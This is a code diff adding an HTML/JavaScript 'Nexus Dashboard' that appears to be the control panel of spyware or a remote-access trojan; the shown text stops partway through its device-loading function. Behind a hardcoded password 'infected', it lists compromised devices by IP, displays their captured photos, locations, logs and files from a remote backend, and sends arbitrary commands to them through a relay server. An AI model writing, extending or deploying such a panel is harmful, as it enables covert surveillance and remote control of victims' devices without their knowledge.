@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nexus Dashboard</title>
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <style>
+        /* ============================================================
+           GOOGLE MATERIAL DESIGN – DARK THEME
+           ============================================================ */
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a12;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;background-image:radial-gradient(ellipse at 50% 0%,#1a1a2e 0%,#0a0a12 70%)}
+        .login-container{display:none;justify-content:center;align-items:center;min-height:100vh;width:100%;position:fixed;top:0;left:0;background:rgba(10,10,18,0.95);backdrop-filter:blur(20px);z-index:9999;padding:20px}
+        .login-container.active{display:flex}
+        .login-card{background:rgba(20,20,31,0.8);backdrop-filter:blur(30px);border-radius:32px;padding:48px 40px;max-width:420px;width:100%;border:1px solid rgba(42,42,68,0.6);box-shadow:0 40px 80px rgba(0,0,0,0.8),inset 0 1px 0 rgba(255,255,255,0.05);text-align:center;animation:fadeUp 0.5s ease}
+        @keyframes fadeUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+        .login-card .lock-icon{font-size:64px;display:block;margin-bottom:12px}
+        .login-card h1{font-size:28px;font-weight:700;background:linear-gradient(135deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:6px}
+        .login-card .sub{color:#8a8aaa;font-size:14px;line-height:1.6;margin-bottom:28px}
+        .login-card input{width:100%;padding:16px 20px;border-radius:60px;border:1px solid rgba(42,42,68,0.6);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:16px;text-align:center;letter-spacing:3px;outline:none;transition:border-color 0.3s,box-shadow 0.3s;backdrop-filter:blur(10px)}
+        .login-card input:focus{border-color:#f7971e;box-shadow:0 0 30px rgba(247,151,30,0.1)}
+        .login-card input::placeholder{color:#4a6a7a;letter-spacing:1px}
+        .login-card .btn{background:linear-gradient(135deg,#f7971e,#ffd200);border:none;padding:16px;border-radius:60px;font-weight:700;font-size:17px;color:#0a0a12;width:100%;cursor:pointer;margin-top:16px;transition:transform 0.2s,box-shadow 0.2s;box-shadow:0 8px 24px rgba(247,151,30,0.25)}
+        .login-card .btn:hover{transform:scale(1.02);box-shadow:0 12px 36px rgba(247,151,30,0.35)}
+        .login-card .btn:active{transform:scale(0.96)}
+        .login-card .error-msg{color:#ff5e5e;font-size:13px;min-height:24px;margin-top:12px}
+        .login-card .footer-text{font-size:11px;color:#4a4a6a;margin-top:20px}
+        .dashboard-container{display:none;width:100%;max-width:1440px;margin:0 auto;animation:fadeUp 0.5s ease}
+        .dashboard-container.active{display:block}
+        .dashboard-header{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;margin-bottom:28px;padding:16px 24px;background:rgba(20,20,31,0.5);backdrop-filter:blur(20px);border-radius:20px;border:1px solid rgba(42,42,68,0.3)}
+        .dashboard-header h1{font-size:24px;font-weight:700;background:linear-gradient(135deg,#f7971e,#ffd200);-webkit-background-clip:text;-webkit-text-fill-color:transparent;display:flex;align-items:center;gap:10px}
+        .dashboard-header h1 span{font-size:28px;-webkit-text-fill-color:initial;color:#ff3b3b}
+        .dashboard-header .header-actions{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+        .dashboard-header .badge{background:rgba(26,42,26,0.6);color:#6fcf97;padding:4px 16px;border-radius:60px;font-size:12px;border:1px solid rgba(42,74,42,0.4);backdrop-filter:blur(10px)}
+        .dashboard-header .logout-btn{background:rgba(42,42,68,0.6);border:1px solid rgba(42,42,68,0.4);padding:8px 20px;border-radius:60px;color:#e0e0e0;font-weight:600;font-size:13px;cursor:pointer;transition:all 0.2s;backdrop-filter:blur(10px)}
+        .dashboard-header .logout-btn:hover{background:rgba(58,58,90,0.8);border-color:#f7971e}
+        .dashboard-header .settings-btn{background:rgba(42,42,68,0.4);border:1px solid rgba(42,42,68,0.3);border-radius:50%;width:36px;height:36px;display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer;transition:all 0.2s;backdrop-filter:blur(10px)}
+        .dashboard-header .settings-btn:hover{background:rgba(58,58,90,0.8);border-color:#f7971e}
+        .controls{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:24px;align-items:center;padding:12px 20px;background:rgba(20,20,31,0.3);backdrop-filter:blur(10px);border-radius:16px;border:1px solid rgba(42,42,68,0.2)}
+        .controls .refresh-btn{background:linear-gradient(135deg,#2a2a44,#3a3a5a);border:none;padding:10px 28px;border-radius:60px;color:#e0e0e0;font-weight:600;font-size:14px;cursor:pointer;transition:all 0.2s;border:1px solid rgba(42,42,68,0.3);position:relative}
+        .controls .refresh-btn:disabled{opacity:0.6;cursor:not-allowed}
+        .controls .refresh-btn .spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .controls .info-text{color:#4a6a7a;font-size:13px}
+        .controls label{display:flex;align-items:center;gap:6px;color:#4a6a7a;font-size:13px;cursor:pointer}
+        .controls label input{accent-color:#f7971e;width:16px;height:16px;cursor:pointer}
+        .controls .export-btn{background:#2a2a44;border:none;padding:8px 20px;border-radius:60px;color:#e0e0e0;font-weight:600;cursor:pointer;font-size:13px}
+        .controls .export-btn:hover{background:#3a3a5a}
+        .stats-bar{display:flex;gap:24px;flex-wrap:wrap;background:rgba(20,20,31,0.4);backdrop-filter:blur(20px);padding:16px 28px;border-radius:20px;border:1px solid rgba(42,42,68,0.3);margin-bottom:28px}
+        .stats-bar .stat{font-size:14px;color:#8a8aaa;display:flex;align-items:center;gap:8px}
+        .stats-bar .stat .num{color:#f7971e;font-weight:700;font-size:22px;min-width:30px}
+        .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:24px}
+        .device-card{background:rgba(20,20,31,0.5);backdrop-filter:blur(20px);border-radius:20px;padding:22px;border:1px solid rgba(42,42,68,0.3);transition:all 0.3s ease;box-shadow:0 8px 32px rgba(0,0,0,0.2)}
+        .device-card:hover{border-color:rgba(247,151,30,0.3);transform:translateY(-4px);box-shadow:0 16px 48px rgba(0,0,0,0.4)}
+        .device-card .device-ip{color:#88ccff;font-size:18px;font-weight:600;margin-bottom:2px;font-family:'Courier New',monospace}
+        .device-card .device-meta{font-size:13px;color:#8a8aaa;line-height:1.8;margin-bottom:14px;padding:8px 0;border-bottom:1px solid rgba(42,42,68,0.2)}
+        .device-card .device-meta .label{color:#4a6a7a}
+        .device-card .device-meta .highlight{color:#6fcf97}
+        .device-card .device-meta .row{display:flex;gap:16px;flex-wrap:wrap}
+        .device-card .notes-area{margin-top:8px;display:flex;gap:8px}
+        .device-card .notes-area input{flex:1;padding:6px 12px;border-radius:30px;border:1px solid rgba(42,42,68,0.3);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:12px;outline:none}
+        .device-card .notes-area input:focus{border-color:#f7971e}
+        .device-card .notes-area button{padding:6px 14px;border-radius:30px;border:none;background:#2a2a44;color:#e0e0e0;font-weight:600;cursor:pointer;font-size:12px}
+        .device-card .notes-area button:hover{background:#3a3a5a}
+        .status-indicator{display:inline-flex;align-items:center;gap:6px;font-size:12px;font-weight:600;padding:2px 12px;border-radius:30px}
+        .status-online{background:rgba(26,42,26,0.6);color:#6fcf97;border:1px solid rgba(42,74,42,0.4)}
+        .status-offline{background:rgba(42,26,26,0.6);color:#ff5e5e;border:1px solid rgba(74,42,42,0.4)}
+        .status-dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px}
+        .status-dot.online{background:#6fcf97}
+        .status-dot.offline{background:#ff5e5e}
+        .section-title{color:#88ccff;font-size:12px;font-weight:600;margin-top:14px;margin-bottom:6px;display:flex;align-items:center;gap:10px;text-transform:uppercase;letter-spacing:0.5px}
+        .section-title .count{background:rgba(26,26,46,0.6);padding:0 12px;border-radius:20px;font-size:10px;color:#4a6a7a;font-weight:400}
+        .photo-grid{display:flex;gap:8px;flex-wrap:wrap;margin-top:4px}
+        .photo-grid img{width:80px;height:80px;object-fit:cover;border-radius:12px;border:1px solid rgba(42,42,68,0.3);cursor:pointer;transition:all 0.2s ease}
+        .photo-grid img:hover{transform:scale(1.05);border-color:#f7971e;box-shadow:0 8px 24px rgba(247,151,30,0.2)}
+        .photo-grid .no-data{color:#4a6a7a;font-size:12px;padding:4px 0}
+        .log-area{background:rgba(11,11,20,0.5);backdrop-filter:blur(10px);border-radius:12px;padding:8px 12px;max-height:110px;overflow-y:auto;font-family:'Courier New',monospace;font-size:10px;line-height:1.7;border:1px solid rgba(26,26,46,0.4);margin-top:4px}
+        .log-area .log-entry{border-bottom:1px solid rgba(15,15,26,0.4);padding:2px 0}
+        .log-area .log-entry .time{color:#4a6a7a;margin-right:8px}
+        .log-area .log-entry .lvl-info{color:#88ccff}
+        .log-area .log-entry .lvl-warn{color:#ffaa44}
+        .log-area .log-entry .lvl-error{color:#ff5e5e}
+        .log-area .log-entry .lvl-success{color:#6fcf97}
+        .loc-list{font-size:12px;color:#8a8aaa;margin-top:4px}
+        .loc-list .loc-entry{padding:3px 0;border-bottom:1px solid rgba(15,15,26,0.3);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px}
+        .loc-list .loc-entry .coords{color:#88ccff}
+        .loc-list .loc-entry .time{color:#4a6a7a;font-size:10px}
+        .map-container{height:200px;border-radius:12px;margin-top:8px;border:1px solid rgba(42,42,68,0.3);overflow:hidden}
+        .btn{background:rgba(42,42,68,0.6);border:1px solid rgba(42,42,68,0.3);padding:6px 14px;border-radius:30px;color:#e0e0e0;font-weight:600;cursor:pointer;font-size:12px;transition:all 0.2s;margin-top:4px;display:inline-block}
+        .btn:hover{background:rgba(58,58,90,0.8);border-color:#f7971e}
+        .btn-primary{background:linear-gradient(135deg,#f7971e,#ffd200);color:#0a0a12;border:none}
+        .btn-primary:hover{transform:scale(1.02)}
+        .command-section{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+        .command-section input{flex:1;padding:8px 14px;border-radius:30px;border:1px solid rgba(42,42,68,0.3);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:13px;outline:none;min-width:120px}
+        .command-section input:focus{border-color:#f7971e}
+        details{width:100%;margin-top:8px}
+        details summary{color:#88ccff;font-size:12px;cursor:pointer;font-weight:500}
+        details summary:hover{color:#f7971e}
+        .error-box{background:rgba(42,26,26,0.6);backdrop-filter:blur(10px);border:1px solid rgba(255,94,94,0.3);border-radius:16px;padding:20px;color:#ff5e5e;grid-column:1/-1;text-align:center}
+        .loading-overlay{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.3);border-radius:20px;backdrop-filter:blur(2px);align-items:center;justify-content:center;z-index:10}
+        .loading-overlay.show{display:flex}
+        .loading-overlay .spinner{width:40px;height:40px;border:4px solid rgba(255,255,255,0.2);border-top-color:#fff;border-radius:50%;animation:spin 0.8s linear infinite}
+        .device-card{position:relative}
+        .hidden-extra{display:none}
+        .show-all-btn{cursor:pointer}
+        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(8px);z-index:10000;justify-content:center;align-items:center;padding:20px}
+        .modal-overlay.open{display:flex}
+        .modal-card{background:rgba(20,20,31,0.95);border-radius:28px;padding:36px 32px;max-width:600px;width:100%;border:1px solid rgba(42,42,68,0.6);box-shadow:0 40px 80px rgba(0,0,0,0.9);max-height:80vh;overflow-y:auto}
+        .modal-card h2{font-size:22px;color:#f7971e;margin-bottom:16px;display:flex;align-items:center;gap:10px}
+        .modal-card .close-modal{background:none;border:none;color:#4a6a7a;font-size:24px;cursor:pointer;float:right}
+        .modal-card .close-modal:hover{color:#e0e0e0}
+        .modal-card .history-item{border-bottom:1px solid #1a1a2e;padding:8px 0;font-size:13px}
+        .modal-card .history-item .cmd{color:#88ccff;font-weight:600}
+        .modal-card .history-item .out{color:#6fcf97;white-space:pre-wrap;font-family:'Courier New',monospace;font-size:12px;margin-top:4px;background:#0b0b14;padding:4px 8px;border-radius:8px}
+        @media(max-width:600px){.login-card{padding:32px 24px}.device-grid{grid-template-columns:1fr}.stats-bar{gap:12px;padding:14px 16px;flex-wrap:wrap}.dashboard-header{padding:12px 16px}.dashboard-header h1{font-size:20px}.controls{padding:10px 14px}.device-card{padding:16px}.photo-grid img{width:60px;height:60px}}
+    </style>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</head>
+<body>
+    <!-- LOGIN SCREEN -->
+    <div class="login-container active" id="loginContainer">
+        <div class="login-card">
+            <span class="lock-icon">🔒</span>
+            <h1>Admin Access</h1>
+            <p class="sub">Enter the password to view the Nexus dashboard.</p>
+            <input type="password" id="passwordInput" placeholder="Enter password" autofocus />
+            <button class="btn" id="loginBtn">Unlock Dashboard</button>
+            <div class="error-msg" id="loginError"></div>
+            <p class="footer-text">🔐 This dashboard is password protected.</p>
+        </div>
+    </div>
+
+    <!-- DASHBOARD -->
+    <div class="dashboard-container" id="dashboardContainer">
+        <div class="dashboard-header">
+            <h1><span>☠️</span> Nexus Dashboard</h1>
+            <div class="header-actions">
+                <span class="badge">🔐 Protected</span>
+                <button class="logout-btn" id="logoutBtn">🚪 Logout</button>
+                <button class="settings-btn" id="settingsBtn" title="Settings">⚙️</button>
+            </div>
+        </div>
+
+        <div class="controls">
+            <button class="refresh-btn" id="refreshBtn"><span class="icon">🔄</span> Refresh</button>
+            <label><input type="checkbox" id="autoRefreshToggle"> Auto-Refresh (5s)</label>
+            <button class="export-btn" id="exportCsvBtn">📥 Export CSV</button>
+            <span class="info-text" id="lastUpdatedLabel">Last updated: never</span>
+        </div>
+
+        <div class="stats-bar" id="statsBar">
+            <div class="stat">📱 IP Groups: <span class="num" id="statDevices">0</span></div>
+            <div class="stat">📸 Photos: <span class="num" id="statPhotos">0</span></div>
+            <div class="stat">📍 Locations: <span class="num" id="statLocations">0</span></div>
+            <div class="stat">📋 Logs: <span class="num" id="statLogs">0</span></div>
+        </div>
+
+        <div class="device-grid" id="deviceGrid">
+            <!-- Cards will be rendered here -->
+        </div>
+    </div>
+
+    <!-- SETTINGS MODAL -->
+    <div class="modal-overlay" id="settingsModal">
+        <div class="modal-card">
+            <button class="close-modal" id="closeSettingsBtn">✕</button>
+            <h2>⚙️ Settings</h2>
+            <p style="color:#4a6a7a;font-size:12px;margin-bottom:12px;">
+                📄 Values are loaded from <code>config.json</code> (permanent).<br>
+                Changes here are saved to your browser's <code>localStorage</code> but will be overridden by the config file on next load.
+            </p>
+            <label style="display:block;font-size:13px;color:#8a8aaa;margin-top:14px;margin-bottom:4px;">Backend URL</label>
+            <input type="text" id="backendInput" style="width:100%;padding:12px 16px;border-radius:30px;border:1px solid rgba(42,42,68,0.4);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:14px;outline:none;" />
+            <label style="display:block;font-size:13px;color:#8a8aaa;margin-top:14px;margin-bottom:4px;">Relay API URL</label>
+            <input type="text" id="relayInput" style="width:100%;padding:12px 16px;border-radius:30px;border:1px solid rgba(42,42,68,0.4);background:rgba(11,11,20,0.6);color:#e0e0e0;font-size:14px;outline:none;" />
+            <div style="display:flex;gap:10px;margin-top:16px;flex-wrap:wrap;">
+                <button class="btn-save" id="saveSettingsBtn" style="flex:1;padding:12px;background:linear-gradient(135deg,#f7971e,#ffd200);border:none;border-radius:60px;font-weight:700;font-size:16px;color:#0a0a12;cursor:pointer;">💾 Save to localStorage</button>
+                <button class="btn-save" id="resetSettingsBtn" style="flex:1;padding:12px;background:#2a2a44;border:none;border-radius:60px;font-weight:600;font-size:14px;color:#e0e0e0;cursor:pointer;">↻ Reload from config.json</button>
+            </div>
+            <div id="settingsStatus" style="margin-top:10px;font-size:12px;color:#4a6a7a;text-align:center;"></div>
+        </div>
+    </div>
+
+    <!-- HISTORY MODAL -->
+    <div class="modal-overlay" id="historyModal">
+        <div class="modal-card">
+            <button class="close-modal" id="closeHistoryBtn">✕</button>
+            <h2>📜 Command History</h2>
+            <div id="historyContent">Loading...</div>
+        </div>
+    </div>
+
+    <script>
+        // ============================================================
+        //  CONFIG — DEFAULTS (hardcoded with new backend)
+        // ============================================================
+        const DEFAULTS = {
+            backend: 'https://nexus-backend-v2.vercel.app',
+            relay: 'https://relay-server-35gk.onrender.com/send-command'
+        };
+
+        // ============================================================
+        //  LOAD CONFIG FROM JSON FILE (optional)
+        // ============================================================
+        let configLoaded = false;
+        let configData = {};
+
+        async function loadConfigFile() {
+            try {
+                const resp = await fetch('./config.json');
+                if (!resp.ok) throw new Error('Config file not found');
+                const data = await resp.json();
+                configData = data;
+                configLoaded = true;
+                console.log('[Config] Loaded from config.json:', configData);
+            } catch (e) {
+                console.warn('[Config] Could not load config.json, using fallback.', e.message);
+                configLoaded = false;
+            }
+        }
+
+        // ============================================================
+        //  GET CONFIG VALUE (priority: config.json > localStorage > DEFAULTS)
+        // ============================================================
+        function getConfigValue(key) {
+            if (configLoaded && configData[key] !== undefined && configData[key] !== '') {
+                return configData[key];
+            }
+            const stored = localStorage.getItem(key);
+            if (stored !== null && stored !== '') {
+                return stored;
+            }
+            return DEFAULTS[key] || '';
+        }
+
+        function getBackend() { return getConfigValue('backend_url'); }
+        function getRelay() { return getConfigValue('relay_api'); }
+
+        // ============================================================
+        //  DOM REFS
+        // ============================================================
+        const loginContainer = document.getElementById('loginContainer');
+        const dashboardContainer = document.getElementById('dashboardContainer');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const loginError = document.getElementById('loginError');
+        const logoutBtn = document.getElementById('logoutBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const autoRefreshToggle = document.getElementById('autoRefreshToggle');
+        const exportCsvBtn = document.getElementById('exportCsvBtn');
+        const deviceGrid = document.getElementById('deviceGrid');
+        const statDevices = document.getElementById('statDevices');
+        const statPhotos = document.getElementById('statPhotos');
+        const statLocations = document.getElementById('statLocations');
+        const statLogs = document.getElementById('statLogs');
+        const settingsBtn = document.getElementById('settingsBtn');
+        const settingsModal = document.getElementById('settingsModal');
+        const closeSettingsBtn = document.getElementById('closeSettingsBtn');
+        const backendInput = document.getElementById('backendInput');
+        const relayInput = document.getElementById('relayInput');
+        const saveSettingsBtn = document.getElementById('saveSettingsBtn');
+        const resetSettingsBtn = document.getElementById('resetSettingsBtn');
+        const settingsStatus = document.getElementById('settingsStatus');
+        const historyModal = document.getElementById('historyModal');
+        const closeHistoryBtn = document.getElementById('closeHistoryBtn');
+        const historyContent = document.getElementById('historyContent');
+        const lastUpdatedLabel = document.getElementById('lastUpdatedLabel');
+
+        let isLoading = false;
+        let refreshInterval = null;
+
+        // ============================================================
+        //  AUTH
+        // ============================================================
+        function checkAuth() {
+            const auth = localStorage.getItem('dashboard_auth');
+            if (auth === 'true') {
+                loginContainer.classList.remove('active');
+                dashboardContainer.classList.add('active');
+                loadDevices();
+                return true;
+            }
+            loginContainer.classList.add('active');
+            dashboardContainer.classList.remove('active');
+            return false;
+        }
+        function login() {
+            const pass = passwordInput.value.trim();
+            if (pass === 'infected') {
+                localStorage.setItem('dashboard_auth','true');
+                loginError.textContent='';
+                passwordInput.value='';
+                loginContainer.classList.remove('active');
+                dashboardContainer.classList.add('active');
+                loadDevices();
+            } else {
+                loginError.textContent='❌ Incorrect password. Try again.';
+                passwordInput.value='';
+                passwordInput.focus();
+            }
+        }
+        function logout() {
+            localStorage.removeItem('dashboard_auth');
+            dashboardContainer.classList.remove('active');
+            loginContainer.classList.add('active');
+            passwordInput.value='';
+            loginError.textContent='';
+            passwordInput.focus();
+        }
+        loginBtn.addEventListener('click', login);
+        passwordInput.addEventListener('keydown', e => { if (e.key === 'Enter') login(); });
+        logoutBtn.addEventListener('click', logout);
+
+        // ============================================================
+        //  SETTINGS MODAL
+        // ============================================================
+        function openSettings() {
+            backendInput.value = getBackend();
+            relayInput.value = getRelay();
+            const source = configLoaded ? 'config.json' : (localStorage.getItem('backend_url') ? 'localStorage' : 'defaults');
+            settingsStatus.textContent = `📄 Loaded from: ${source}`;
+            settingsModal.classList.add('open');
+        }
+        function closeSettings() { settingsModal.classList.remove('open'); }
+        function saveSettings() {
+            const b = backendInput.value.trim();
+            const r = relayInput.value.trim();
+            if (b) localStorage.setItem('backend_url', b);
+            if (r) localStorage.setItem('relay_api', r);
+            settingsStatus.textContent = '✅ Saved to localStorage (will be used if config.json is missing)';
+            closeSettings();
+            loadDevices();
+        }
+        function reloadFromConfig() {
+            loadConfigFile().then(() => {
+                backendInput.value = getBackend();
+                relayInput.value = getRelay();
+                settingsStatus.textContent = '↻ Reloaded from config.json';
+            });
+        }
+        settingsBtn.addEventListener('click', openSettings);
+        closeSettingsBtn.addEventListener('click', closeSettings);
+        saveSettingsBtn.addEventListener('click', saveSettings);
+        resetSettingsBtn.addEventListener('click', reloadFromConfig);
+        settingsModal.addEventListener('click', function(e) { if (e.target === this) closeSettings(); });
+
+        // ============================================================
+        //  EXPORT CSV
+        // ============================================================
+        async function exportCsv() {
+            const backend = getBackend();
+            const devices = await fetchJSON(`${backend}/api/devices`);
+            if (!devices) return;
+            const groups = groupByIp(devices);
+            let csv = 'IP,Platform,Screen,Last Seen,Notes,Device IDs\n';
+            for (const [ip, list] of Object.entries(groups)) {
+                const latest = list.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
+                const ids = list.map(d => d.id).join(';');
+                csv += `${ip},${latest.platform},${latest.screen},${new Date(latest.last_seen).toLocaleString()},${(latest.notes||'').replace(/,/g,';')},${ids}\n`;
+            }
+            const blob = new Blob([csv], { type: 'text/csv' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a'); a.href = url; a.download = `devices_grouped_${Date.now()}.csv`; a.click(); URL.revokeObjectURL(url);
+        }
+        exportCsvBtn.addEventListener('click', exportCsv);
+
+        // ============================================================
+        //  AUTO-REFRESH TOGGLE
+        // ============================================================
+        autoRefreshToggle.addEventListener('change', function() {
+            if (this.checked) {
+                if (refreshInterval) clearInterval(refreshInterval);
+                refreshInterval = setInterval(loadDevices, 5000);
+            } else {
+                if (refreshInterval) { clearInterval(refreshInterval); refreshInterval = null; }
+            }
+        });
+
+        // ============================================================
+        //  API HELPERS
+        // ============================================================
+        async function fetchJSON(url) {
+            try {
+                const r = await fetch(url);
+                if (!r.ok) throw new Error('HTTP '+r.status);
+                return await r.json();
+            } catch(e) {
+                console.error(e);
+                return null;
+            }
+        }
+
+        // ============================================================
+        //  SEND COMMAND
+        // ============================================================
+        async function sendCommand(deviceId) {
+            const input = document.getElementById(`cmd_input_${deviceId}`);
+            if (!input) return;
+            const command = input.value.trim();
+            if (!command) return;
+            input.disabled = true;
+            input.placeholder = '⏳ Sending...';
+            try {
+                const resp = await fetch(getRelay(), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, command })
+                });
+                const result = await resp.json();
+                if (result.success) {
+                    input.value = '';
+                    input.placeholder = '✅ Sent!';
+                    setTimeout(() => input.placeholder = 'Enter command...', 2000);
+                } else {
+                    input.placeholder = '❌ Error: ' + (result.error || 'Unknown');
+                }
+            } catch (e) {
+                input.placeholder = '❌ Failed: ' + e.message;
+            }
+            input.disabled = false;
+        }
+
+        // ============================================================
+        //  UPDATE NOTES
+        // ============================================================
+        async function updateNotes(deviceId) {
+            const input = document.getElementById(`notes_input_${deviceId}`);
+            if (!input) return;
+            const notes = input.value.trim();
+            const backend = getBackend();
+            try {
+                await fetch(`${backend}/api/update-device`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, notes })
+                });
+                input.style.borderColor = '#6fcf97';
+                setTimeout(() => input.style.borderColor = '', 1500);
+            } catch(e) { console.error(e); }
+        }
+
+        // ============================================================
+        //  SHOW HISTORY
+        // ============================================================
+        async function showHistory(deviceId) {
+            historyModal.classList.add('open');
+            historyContent.innerHTML = '⏳ Loading...';
+            const backend = getBackend();
+            const details = await fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(deviceId)}`);
+            if (!details) { historyContent.innerHTML = '❌ Failed to load history.'; return; }
+            let html = '';
+            const cmds = details.commands || [];
+            const results = details.results || [];
+            const map = {};
+            results.forEach(r => { map[r.command_id] = r; });
+            if (cmds.length === 0) {
+                html = '<p style="color:#4a6a7a;">No commands sent.</p>';
+            } else {
+                cmds.slice(0, 20).forEach(c => {
+                    const r = map[c.id];
+                    html += `<div class="history-item"><span class="cmd">${c.command}</span> <span style="color:#4a6a7a;font-size:11px;">[${c.status}]</span>`;
+                    if (r) {
+                        html += `<div class="out">${r.output || r.error || '(no output)'}</div>`;
+                    }
+                    html += `<div style="font-size:10px;color:#4a6a7a;">${new Date(c.sent_at).toLocaleString()}</div></div>`;
+                });
+                if (cmds.length > 20) {
+                    html += `<div style="color:#4a6a7a;font-size:11px;margin-top:8px;">+ ${cmds.length-20} more...</div>`;
+                }
+            }
+            historyContent.innerHTML = html;
+        }
+        closeHistoryBtn.addEventListener('click', () => historyModal.classList.remove('open'));
+        historyModal.addEventListener('click', function(e) { if (e.target === this) this.classList.remove('open'); });
+
+        // ============================================================
+        //  GROUP DEVICES BY IP
+        // ============================================================
+        function groupByIp(devices) {
+            const groups = {};
+            devices.forEach(d => {
+                const key = d.ip || 'unknown';
+                if (!groups[key]) groups[key] = [];
+                groups[key].push(d);
+            });
+            return groups;
+        }
+
+        // ============================================================
+        //  GET GROUP STATUS
+        // ============================================================
+        function getGroupStatus(devices) {
+            const now = Date.now();
+            for (const d of devices) {
+                if ((now - d.last_seen) < 60000) return 'online';
+            }
+            return 'offline';
+        }
+
+        // ============================================================
+        //  TOGGLE EXTRA DATA
+        // ============================================================
+        function toggleExtra(repId) {
+            const photoLimited = document.getElementById(`photo_limited_${repId}`);
+            const photoFull = document.getElementById(`photo_full_${repId}`);
+            const logLimited = document.getElementById(`log_limited_${repId}`);
+            const logFull = document.getElementById(`log_full_${repId}`);
+            const locLimited = document.getElementById(`loc_limited_${repId}`);
+            const locFull = document.getElementById(`loc_full_${repId}`);
+            const btn = document.getElementById(`toggle_btn_${repId}`);
+            if (!btn) return;
+            const hidden = photoFull.style.display === 'none' || photoFull.style.display === '';
+            if (hidden) {
+                photoLimited.style.display = 'none';
+                photoFull.style.display = 'flex';
+                logLimited.style.display = 'none';
+                logFull.style.display = 'block';
+                locLimited.style.display = 'none';
+                locFull.style.display = 'block';
+                btn.textContent = '📂 Hide Extra';
+            } else {
+                photoLimited.style.display = 'flex';
+                photoFull.style.display = 'none';
+                logLimited.style.display = 'block';
+                logFull.style.display = 'none';
+                locLimited.style.display = 'block';
+                locFull.style.display = 'none';
+                btn.textContent = '📂 Show All Data';
+            }
+        }
+
+        // ============================================================
+        //  UPDATE LAST UPDATED TIMESTAMP
+        // ============================================================
+        function updateLastUpdated() {
+            const now = new Date();
+            lastUpdatedLabel.textContent = `Last updated: ${now.toLocaleString()}`;
+        }
+
+        // ============================================================
+        //  LOAD DEVICES — SMOOTH (no flash)
+        // ============================================================
+        async function loadDevices() {
+            if (isLoading) return;
+            isLoading = true;
+            refreshBtn.disabled = true;
+            refreshBtn.innerHTML = '<span class="spinner"></span> Loading...';
+
+            const backend = getBackend();
+            try {
+                const devices = await fetchJSON(`${backend}/api/devices`);
+                if (!devices) {
+                    deviceGrid.innerHTML = `<div class="error-box">❌ Failed to load devices. Check your backend URL.</div>`;
+                    isLoading = false;
+                    refreshBtn.disabled = false;
+                    refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
+                    return;
+                }
+
+                if (devices.length === 0) {
+                    deviceGrid.innerHTML = `<div class="error-box">⚠️ No devices registered yet.</div>`;
+                    statDevices.textContent='0'; statPhotos.textContent='0'; statLocations.textContent='0'; statLogs.textContent='0';
+                    isLoading = false;
+                    refreshBtn.disabled = false;
+                    refreshBtn.innerHTML = '<span class="icon">🔄</span> Refresh';
+                    updateLastUpdated();
+                    return;
+                }
+
+                const groups = groupByIp(devices);
+                const groupKeys = Object.keys(groups);
+                statDevices.textContent = groupKeys.length;
+
+                const allIds = [];
+                for (const ip of groupKeys) {
+                    const ids = groups[ip].map(d => d.id);
+                    allIds.push({ ip, ids });
+                }
+
+                const detailPromises = [];
+                for (const item of allIds) {
+                    for (const id of item.ids) {
+                        detailPromises.push(
+                            fetchJSON(`${backend}/api/device-details?deviceId=${encodeURIComponent(id)}`)
+                                .then(data => ({ id, data, ip: item.ip }))
+                        );
+                    }
+                }
+
+                const allDetails = await Promise.all(detailPromises);
+                const detailsByIp = {};
+                for (const result of allDetails) {
+                    if (!detailsByIp[result.ip]) detailsByIp[result.ip] = [];
+                    if (result.data) detailsByIp[result.ip].push(result.data);
+                }
+
+                let totalPhotos = 0, totalLogs = 0, totalLocations = 0;
+                const fragment = document.createDocumentFragment();
+
+                for (const ip of groupKeys) {
+                    const deviceList = groups[ip];
+                    const latest = deviceList.reduce((a,b) => a.last_seen > b.last_seen ? a : b);
+                    const detailsList = detailsByIp[ip] || [];
+
+                    let allPhotos = [], allLogs = [], allLocations = [], allFiles = [], allCommands = [], allResults = [];
+                    for (const d of detailsList) {
+                        allPhotos = allPhotos.concat(d.photos || []);
+                        allLogs = allLogs.concat(d.logs || []);
+                        allLocations = allLocations.concat(d.locations || []);
+                        allFiles = allFiles.concat(d.files || []);
